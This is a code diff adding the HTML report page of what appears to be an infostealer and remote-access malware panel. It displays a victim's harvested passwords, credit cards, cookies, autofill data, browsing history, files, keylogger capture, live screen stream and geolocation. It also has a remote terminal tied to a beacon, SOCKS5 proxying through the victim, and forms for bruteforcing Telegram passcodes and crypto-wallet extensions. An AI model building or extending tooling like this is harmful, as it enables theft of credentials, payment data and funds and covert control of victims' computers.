@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Report</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="icon" type="image/png" href="images/app-logo.ico"/>
+        <!-- Libs -->
+        <link rel="stylesheet" href="lib/css/report.css" />
+        <link rel="stylesheet" href="lib/css/uikit.min.css" />
+        <script src="lib/js/uikit.min.js"></script>
+        <script src="lib/js/iconify-icon.min.js"></script>
+        <script src="lib/js/WS_script.js"></script>
+        <script src="lib/js/WS_report.js"></script>
+
+        <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" crossorigin="" />
+        <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=" crossorigin=""></script>  
+    </head>
+    <body>
+        
+        $CurrentTemp
+        $JS_COOKIES
+        $JS_FILES
+        $JS_NETWORKS
+        $BEACON_URL
+        
+        <!-- Navigation -->
+        <nav class="uk-navbar-container" uk-navbar="align: center">
+            <div class="uk-navbar">
+                <ul class="uk-navbar-nav">
+                    <li>
+                        <img width="64" height="64" src="images/logo.png" alt="Logo">
+                        <p id="project_name" class="uk-label" style="font-size: 20px; font-family: monospace;"></p>
+                    </li>
+                    <!-- Export options -->
+                    <li class="nav-el">
+                        <p>
+                            <iconify-icon icon="material-symbols:export-notes"></iconify-icon> Export
+                            <div uk-dropdown>
+                                <ul class="uk-nav uk-dropdown-nav">
+                                    <li id="export-json-report-block"><a onclick="export_report('json');" href="#"><iconify-icon icon="bi:filetype-json"></iconify-icon>Export JSON</a></li>
+                                    <li><a onclick="export_report('zip');" href="#"><iconify-icon icon="ph:file-zip-duotone"></iconify-icon>Export ZIP</a></li>
+                                </ul>
+                            </div>
+                        </p>
+                    </li>
+                </ul>
+            </div>
+        </nav>
+
+
+        
+        <!-- Telegram bruteforce -->
+        <div id="bruteforce-telegram-passwords-modal" uk-modal>
+            <div class="uk-modal-dialog uk-modal-body">
+                <h5 class="uk-modal-title">Telegram local passcode</h5>
+                <!-- Passwords -->
+                <p>Insert passwords list for bruteforce:</p>
+                <textarea id="bruteforce-telegram-passwords-textarea" class="uk-textarea"></textarea>
+                <!-- Buttons -->
+                <p class="uk-text-right">
+                    <button class="uk-button uk-button-default uk-modal-close" type="button">
+                        <iconify-icon icon="material-symbols:close" style="font-size: 25px;"></iconify-icon>
+                    </button>
+                    <button class="uk-button uk-button-default" type="button" onclick="start_bruteforce_telegram();">
+                        <iconify-icon id="bruteforce-telegram-wallet-passwords-icon" icon="fluent:key-multiple-20-regular" style="font-size: 25px;"></iconify-icon>
+                    </button>
+                </p>
+            </div>
+        </div>
+
+        <!-- Extension Wallet Modal -->
+        <div id="bruteforce-extension-passwords-modal" uk-modal>
+            <div class="uk-modal-dialog uk-modal-body">
+                <h5 class="uk-modal-title" id="current-wallet-title">Wallet</h5>
+                <!-- Passwords -->
+                <p>Insert passwords list for bruteforce:</p>
+                <textarea id="bruteforce-wallet-passwords-textarea" class="uk-textarea"></textarea>
+                <a href="#" id="current-wallet-blockchain">Blockchain</a>
+                <!-- Buttons -->
+                <p class="uk-text-right">
+                    <button class="uk-button uk-button-default uk-modal-close" type="button">
+                        <iconify-icon icon="material-symbols:close" style="font-size: 25px;"></iconify-icon>
+                    </button>
+                    <button class="uk-button uk-button-default" type="button" onclick="start_bruteforce_extension();">
+                        <iconify-icon id="bruteforce-extension-wallet-passwords-icon" icon="fluent:key-multiple-20-regular" style="font-size: 25px;"></iconify-icon>
+                    </button>
+                </p>
+            </div>
+        </div>
+
+        <!-- Data -->
+        <ul uk-accordion="multiple: true; active: 0; duration: 50;">
+
+            <!-- Basic information -->
+            <li>
+                <a class="uk-accordion-title" href="#">
+                    <iconify-icon icon="eos-icons:hardware-circuit"></iconify-icon>
+                    Basic information
+                </a>
+                <div class="uk-accordion-content">
+                    <div class="uk-card uk-card-default uk-card-body uk-flex uk-flex-center">
+                        <div id="system-info" class="uk-margin-left uk-flex-auto uk-text-emphasis">
+                            $SYSTEM_INFO
+                        </div>
+                        <hr class="uk-divider-vertical">
+                        <div class="uk-margin-right">
+                            <img class="pointer" id="screenshot" src="$SCREENSHOT_IMAGE" onerror="this.onerror=null;this.src='images/404.gif';" alt="Desktop screenshot failed" onclick="showImage(this.getAttribute('src'));">
+                        </div>
+                    </div>
+                </div>
+            </li>
+
+            <!-- Automatic actions -->
+            <li>
+                <a class="uk-accordion-title" href="#">
+                    <iconify-icon id="actions_icon" icon="eos-icons:loading"></iconify-icon> 
+                    <span id="actions_text">Scanning for automatic actions (Please wait)</span>
+                </a>
+                <div class="uk-accordion-content">
+                    <div id="actions" class="uk-card uk-card-default uk-card-hover uk-card-body">
+                        <div id="actions_count" class="uk-card-badge uk-label">1 Action available</div>
+                        <!-- Proxies modal -->
+                        <div id="proxies-modal" uk-modal>
+                            <div class="uk-modal-dialog uk-modal-body">
+                                <h5 class="uk-modal-title">SOCKS5 proxies list</h5>
+                                <!-- Proxies -->
+                                <table class="uk-table uk-table-justify uk-table-middle">
+                                    <thead>
+                                        <tr>
+                                            <th>IP</th>
+                                            <th>Country</th>
+                                            <th>City</th>
+                                            <th>ISP</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="proxies-table">
+                                    </tbody>
+                                </table>
+                                <!-- Buttons -->
+                                <p class="uk-text-right">
+                                    <button class="uk-button uk-button-default uk-modal-close" type="button">
+                                        <iconify-icon icon="material-symbols:close" style="font-size: 25px;"></iconify-icon>
+                                    </button>
+                                </p>
+                            </div>
+                        </div>
+                        <!-- Request proxies action -->
+                        <button class="uk-button uk-button-primary" onclick="automatic_action('request_proxies', {})">
+                            <iconify-icon icon="ph:share-network-bold"></iconify-icon> Find proxies
+                        </button>
+                    </div>
+                </div>
+            </li>
+
+
+
+            <!-- Passwords -->
+            <li id="passwords_tab">
+                <a class="uk-accordion-title" href="#">
+                    <iconify-icon icon="mdi:password"></iconify-icon>
+                    Passwords 
+                </a>
+                <div class="uk-accordion-content">
+
+                    <!-- Modal -->
+                    <div id="bruteforce-passwords-modal" uk-modal>
+                        <div class="uk-modal-dialog uk-modal-body">
+                            <h5 class="uk-modal-title">Unique passwords export</h5>
+                            <!-- Passwords -->
+                            <textarea id="bruteforce-passwords-textarea" class="uk-textarea"></textarea>
+                            <!-- Buttons -->
+                            <p class="uk-text-right">
+                                <button class="uk-button uk-button-default uk-modal-close" type="button">
+                                    <iconify-icon icon="material-symbols:close" style="font-size: 25px;"></iconify-icon>
+                                </button>
+                                <button class="uk-button uk-button-default" type="button" onclick="copy_bruteforce_passwords();">
+                                    <iconify-icon icon="material-symbols:content-copy-outline" style="font-size: 25px;"></iconify-icon>
+                                </button>
+                                <button class="uk-button uk-button-primary" type="button" onclick="download_bruteforce_passwords();">
+                                    <iconify-icon icon="ic:baseline-download" style="font-size: 25px;"></iconify-icon>
+                                </button>
+                            </p>
+                        </div>
+                    </div>
+                    
+                    <!-- Export unique passwords -->
+                    <div class="uk-badge pointer" style="font-size: 15px; padding: 14px; margin-bottom: 12px;" onclick="export_brute_list();">
+                        <iconify-icon icon="lucide:list-end" style="font-size: 20px !important; margin-bottom: 5px !important;"></iconify-icon> 
+                         Export for bruteforce
+                    </div>
+                    
+                    <div class="uk-card uk-card-default uk-card-hover uk-card-body">
+
+                        <div class="uk-card-badge uk-label">$PASSWORDS_COUNT passwords</div>
+                        <!-- Seach input -->
+                        <div class="uk-search uk-search-default uk-width-1-1">
+                            <a href="" uk-search-icon></a>
+                            <input class="uk-search-input" type="search" placeholder="Search entries by domain name" aria-label="" data-search>
+                        </div>
+
+                        <table id="passwords-data-table" class="uk-table uk-table-justify uk-table-middle">
+                            <thead>
+                                <tr>
+                                    <th>Hostname</th>
+                                    <th>Username</th>
+                                    <th>Password</th>
+                                    <th>Application</th>
+                                </tr>
+                            </thead>
+                            <tbody id="passwords_table_body" data-searchable>
+                                $PASSWORDS_TABLE
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </li>
+
+            <!-- CreditCards -->
+            <li id="creditcards_tab">
+                <a class="uk-accordion-title" href="#">
+                    <iconify-icon icon="bi:credit-card-2-back-fill"></iconify-icon>
+                    Credit-Cards
+                </a>
+                <div class="uk-accordion-content">
+                    <div class="uk-card uk-card-default uk-card-hover uk-card-body">
+                        <div class="uk-card-badge uk-label">$CREDITCARDS_COUNT credit-cards</div>
+                        <table class="uk-table uk-table-justify uk-table-middle">
+                            <thead>
+                                <tr>
+                                    <th>Number</th>
+                                    <th>Holder</th>
+                                    <th>Expiry</th>
+                                    <th>Scheme</th>
+                                    <th>Brand</th>
+                                    <th>Country</th>
+                                    <th>Application</th>
+                                </tr>
+                            </thead>
+                            <tbody id="creditcards_table_body">
+                                $CREDITCARDS_TABLE
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </li>
+
+            <!-- AutoFill -->
+            <li id="autofill_tab">
+                <a class="uk-accordion-title" href="#">
+                    <iconify-icon icon="fluent-mdl2:text-field"></iconify-icon>
+                    AutoFills
+                </a>
+                <div class="uk-accordion-content">
+                    <div class="uk-card uk-card-default uk-card-hover uk-card-body">
+                        <div class="uk-card-badge uk-label">$AUTOFILL_COUNT autofills</div>
+                        <table class="uk-table uk-table-justify uk-table-middle">
+                            <thead>
+                                <tr>
+                                    <th>Name</th>
+                                    <th>Value</th>
+                                </tr>
+                            </thead>
+                            <tbody id="autofill_table_body">
+                                $AUTOFILL_TABLE
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </li>
+
+            <!-- Cookies -->
+            <li id="cookies_tab">
+                <a class="uk-accordion-title" href="#">
+                    <iconify-icon icon="material-symbols:cookie"></iconify-icon>
+                    Cookies
+                </a>
+                <div class="uk-accordion-content">
+                    <div id="cookies" class="uk-card uk-card-default uk-card-hover uk-card-body">
+                        <div class="uk-card-badge uk-label">$COOKIES_COUNT profiles with cookies</div>
+                        
+                        <!-- Modal -->
+                        <div id="cookies-modal" uk-modal>
+                            <div class="uk-modal-dialog uk-modal-body">
+                                <h5 class="uk-modal-title">Cookies export</h5>
+                                <!-- Cookies -->
+                                <textarea id="current-cookies" class="uk-textarea"></textarea>
+                                <!-- Format select -->
+                                <div class="uk-margin uk-grid-small uk-child-width-auto uk-grid">
+                                    <label><input id="radio_netscape" name="radio_cookie_format" class="uk-radio" type="radio" checked> Netscape</label>
+                                    <label><input id="radio_json" name="radio_cookie_format" class="uk-radio" type="radio"> JSON</label>
+                                </div>
+                                <!-- Buttons -->
+                                <p class="uk-text-right">
+                                    <button class="uk-button uk-button-default uk-modal-close" type="button">
+                                        <iconify-icon icon="material-symbols:close" style="font-size: 25px;"></iconify-icon>
+                                    </button>
+                                    <button class="uk-button uk-button-primary" type="button" onclick="export_cookies()">
+                                        <iconify-icon icon="ic:baseline-download" style="font-size: 25px;"></iconify-icon>
+                                    </button>
+                                </p>
+                            </div>
+                        </div>
+
+                        $HTML_COOKIES
+                        
+                    </div>
+                </div>
+            </li>
+
+            
+            <!-- History -->
+            <li id="history_tab">
+                <a class="uk-accordion-title" href="#">
+                    <iconify-icon icon="material-symbols:history"></iconify-icon>
+                    History
+                </a>
+                <div class="uk-accordion-content">
+                    <div class="uk-card uk-card-default uk-card-hover uk-card-body">
+
+                        <ul id="history" uk-accordion="multiple: true; duration: 30;">
+                            
+                            $HTML_HISTORY
+
+                        </ul>
+                        
+                    </div>
+                </div>
+            </li>
+
+            <!-- Files -->
+            <li id="files_tab">
+                <a class="uk-accordion-title" href="#">
+                    <iconify-icon icon="mdi:files"></iconify-icon>
+                    Documents
+                </a>
+                <div class="uk-accordion-content">
+                    <div class="uk-card uk-card-default uk-card-hover uk-card-body">
+                        <div class="uk-card-badge uk-label" id="files_counter"></div>
+
+                        <div id="files-modal" uk-modal>
+                            <div class="uk-modal-dialog uk-modal-body">
+                                <h5 class="uk-modal-title">File view</h5>
+                                <!-- File data -->
+                                <textarea id="current-file" class="uk-textarea"></textarea>
+                                <!-- Buttons -->
+                                <p class="uk-text-right">
+                                    <button class="uk-button uk-button-default uk-modal-close" type="button">
+                                        <iconify-icon icon="material-symbols:close" style="font-size: 25px;"></iconify-icon>
+                                    </button>
+                                    <button class="uk-button uk-button-primary" type="button" onclick="grabber_download_file(current_filename)">
+                                        <iconify-icon icon="ic:baseline-download" style="font-size: 25px;"></iconify-icon>
+                                    </button>
+                                </p>
+                            </div>
+                        </div>
+
+                        <nav aria-label="Breadcrumb">
+                            <ul class="uk-breadcrumb" id="files_navigation">
+                            </ul>
+                        </nav>
+
+                        <table class="uk-table uk-table-justify uk-table-middle">
+                            <thead>
+                                <tr>
+                                    <th>Name</th>
+                                    <th>Size</th>
+                                    <th>Created Date</th>
+                                    <th>Action</th>
+                                </tr>
+                            </thead>
+                            <tbody id="files_table">
+                            </tbody>
+                        </table>
+
+                    </div>
+                </div>
+            </li>
+
+            <!-- Keylogger data -->
+            <li id="keylogger-item">
+
+                <!-- Modal -->
+                <div id="keylogger-modal" uk-modal>
+                    <div class="uk-modal-dialog uk-modal-body">
+                        <h5 id="keylogger-process-name" class="uk-modal-title"></h5>
+                        <!-- Logs -->
+                        <textarea id="current-keylogger-data" class="uk-textarea"></textarea>
+                        <!-- Buttons -->
+                        <p class="uk-text-right">
+                            <button class="uk-button uk-button-default uk-modal-close" type="button">
+                                <iconify-icon icon="material-symbols:close" style="font-size: 25px;"></iconify-icon>
+                            </button>
+                            <button class="uk-button uk-button-primary" type="button" onclick="export_keylogger();">
+                                <iconify-icon icon="ic:baseline-download" style="font-size: 25px;"></iconify-icon>
+                            </button>
+                        </p>
+                    </div>
+                </div>
+
+                <a class="uk-accordion-title" href="#">
+                    <iconify-icon icon="material-symbols:keyboard"></iconify-icon>
+                    Keylogger
+                </a>
+                <div class="uk-accordion-content">
+                    <div id="keylogger-buttons-data" class="uk-card uk-card-default uk-card-body">
+                        No data
+                    </div>
+                </div>
+            </li>
+
+
+            <!-- Stream -->
+            <li id="stream-item">
+                <a id="stream-item-link" class="uk-accordion-title" href="#" onclick="stop_stream();">
+                    <iconify-icon icon="svg-spinners:bars-scale"></iconify-icon>
+                    Stream
+                </a>
+                <div class="uk-accordion-content">
+                    <div class="uk-card uk-card-default uk-card-hover uk-card-body">
+                        <img id="stream-image" src="images/404.gif" alt="Please wait...">
+                    </div>
+                </div>
+            </li>
+
+            <!-- NetDiscover -->
+            <li id="netdiscover-item">
+                <a class="uk-accordion-title" href="#">
+                    <iconify-icon icon="carbon:network-4"></iconify-icon>
+                    NetDiscover
+                </a>
+                <div class="uk-accordion-content">
+                    <div class="uk-card uk-card-default uk-card-hover uk-card-body">
+                        <ul class="uk-subnav uk-subnav-pill" id="netdiscover-keys" uk-switcher></ul>
+                        <ul class="uk-switcher uk-margin" id="netdiscover-values"></ul>
+                    </div>
+                </div>
+            </li>
+
+            <!-- Geolocation -->
+            <li id="geolocation-item">
+                <a class="uk-accordion-title" href="#" onclick="onOpenGeolocationMenu();">
+                    <iconify-icon id="geolocation_icon" icon="material-symbols:satellite-alt-rounded"></iconify-icon>
+                    Geolocation
+                </a>
+                <div class="uk-accordion-content">
+                    <div class="uk-card uk-card-default uk-card-hover uk-card-body">
+                        <div id="geolocation_loader">
+                            <iconify-icon class="blinking-text" icon="material-symbols:satellite-alt-rounded"></iconify-icon>
+                            <br>
+                            <h2>Connecting to NASA satellites ...</h2>
+                        </div>
+                        <div id="geomap"></div>
+                    </div>
+                </div>
+            </li>
+
+            <!-- Beacon Terminal -->
+            <li id="beacon-terminal-item">
+                
+                <!-- Remote desktop -->
+                <div id="terminal-screenshot-modal" uk-modal>
+                    <div class="uk-modal-dialog uk-width-auto uk-margin-auto-vertical">
+                        <button class="uk-modal-close-outside" type="button" uk-close></button>
+                        <img src="" width="1800" height="1200" alt="ERROR" id="terminal-screenshot-image">
+                    </div>
+                </div>
+
+                <a class="uk-accordion-title" href="#">
+                    <iconify-icon icon="ph:terminal-fill"></iconify-icon>
+                    Remote Terminal <iconify-icon id="terminal-status" icon="svg-spinners:pulse-2"></iconify-icon>
+                </a>
+                <div class="uk-accordion-content">
+                    <div class="uk-card uk-card-default uk-card-body">
+
+                        <iconify-icon width="25px" id="terminal-status-icon" icon="eos-icons:loading"></iconify-icon>
+
+                        <input readonly class="uk-input" type="text" id="terminal-activity-input" value="Please wait ..." style="text-align: center;">
+                        <br>
+                        <textarea class="uk-textarea" id="terminal-output" spellcheck="false" readonly></textarea>
+                        <br>
+                        <input class="uk-input" type="text" autocomplete="off" id="terminal-input">
+
+                    </div>
+                </div>
+            </li>
+            
+        </ul>
+
+        <!-- Scroll up -->
+        <a href="#" uk-totop uk-scroll style="float: right; padding: 30px;"></a>
+
+    </body>
+</html>
